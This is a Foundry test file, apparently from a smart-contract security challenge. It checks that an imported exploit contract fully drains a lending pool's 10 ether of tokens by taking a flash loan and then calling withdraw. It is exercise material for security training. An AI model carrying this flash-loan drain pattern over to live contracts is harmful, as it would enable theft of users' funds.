// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "./InSecureumLenderPoolExploit.sol";

contract InSecureumLenderPoolExploitTest is Test {
    address playerAddress = makeAddr("player");

    function test() public {
        ERC20 token = ERC20(address(new InSecureumToken(10 ether)));

        InSecureumLenderPool target = new InSecureumLenderPool(address(token));
        token.transfer(address(target), 10 ether);
        vm.startPrank(playerAddress, playerAddress);

        InSecureumLenderPoolExploit exploit = new InSecureumLenderPoolExploit(10 ether);
        target.flashLoan(address(exploit), "");
        target.withdraw(10 ether);

        vm.stopPrank();
        assertEq(token.balanceOf(address(target)), 0, "contract must be empty");
    }
}
